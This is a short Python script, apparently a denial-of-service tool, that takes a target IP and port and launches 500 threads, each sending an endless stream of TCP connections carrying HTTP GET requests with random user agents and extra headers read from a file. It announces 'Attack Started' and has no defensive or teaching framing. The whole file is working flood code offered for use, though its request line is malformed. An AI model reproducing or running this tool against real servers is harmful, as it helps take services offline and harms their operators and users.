#!/usr/bin/env python3
import random
import socket,threading,sys,random
import useragents


ip = sys.argv[1]
port = sys.argv[2]


print("[+] Attack Started >:)")

wdata = open("/home/kali/Desktop/DDoS/scripts/headers.txt","r")
data= wdata.read()
def attacks():
    while True:
        try:
            ran = random.choice(useragents.uslist)



            pack = str("GET HTTP/1.1\nHost:"+str(ip)+"\n\nUser-Agent:"+str(ran)+"\n\n"+data).encode("utf-8")

            
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,int(port)))
            s.sendto(pack,(ip,int(port)))
        except socket.error as e:
            print("[!] Can't Connect the target, it could be down!")
            print("\n\n",e)
            exit()
            


for i in range(500):
    thread = threading.Thread(target=attacks)
    thread.start()
